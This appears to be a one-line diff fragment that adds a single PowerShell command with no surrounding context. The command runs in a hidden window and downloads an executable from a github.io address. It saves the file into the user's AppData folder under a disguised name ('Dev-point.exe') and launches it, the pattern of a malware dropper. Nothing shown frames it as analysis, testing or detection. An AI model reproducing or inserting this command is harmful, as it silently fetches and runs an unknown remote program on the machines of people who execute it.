@@ -1,0 +1,1 @@
+powershell.exe -windowstyle hidden (New-Object System.Net.WebClient).DownloadFile('https://ahmt1985.github.io/xxxxxxxx/Server.exe','%APPDATA%\Dev-point.exe');Start-Process '%APPDATA%\Dev-point.exe'
